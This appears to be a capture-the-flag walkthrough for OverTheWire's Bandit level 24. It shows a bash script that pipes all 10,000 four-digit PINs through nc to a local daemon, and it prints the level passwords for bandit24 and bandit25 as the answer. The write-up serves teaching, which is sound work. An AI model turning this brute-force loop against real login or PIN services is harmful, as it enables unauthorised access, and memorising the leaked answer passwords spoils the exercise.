# Level 24

## Explanation

A background program is listening on port 30002. It will give us the password for the next level if we send:
- The password for Bandit 24
- A secret 4-digit PIN code

## Solution
<pre>
bandit24@bandit:~$ cd /tmp
bandit24@bandit:~$ mkdir lvl24
bandit24@bandit:~$ cd lvl24
bandit24@bandit:/tmp/lvl24$ nano brute.sh
bandit24@bandit:/tmp/lvl24$ cat brute.sh
#!/bin/bash
for i in {0000..9999}; do
  echo "gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 $i"
done
bandit24@bandit:/tmp/lvl24$ chmod +x brute.sh
bandit24@bandit:/tmp/lvl24$ ./brute.sh | nc localhost 30002
Correct!
The password of user bandit25 is iCi86ttT4KSNe1armKiwbQNmB3YJP3q4
</pre>


<pre>
#!/bin/bash
for i in {0000..9999}; do
  echo "<bandit24_password> $i"
done
</pre>
This script starts a loop that goes through every number from 0000 to 9999. It covers all possible 4-digit PIN codes — exactly 10,000 combinations
For each PIN, it prints a line that includes:
1. The password for Bandit 24 
2. The current PIN code ($i)
- ``./brute.sh | nc localhost 30002`` This sends all 10,000 combinations to the daemon and  it will respond with the password for bandit 25.
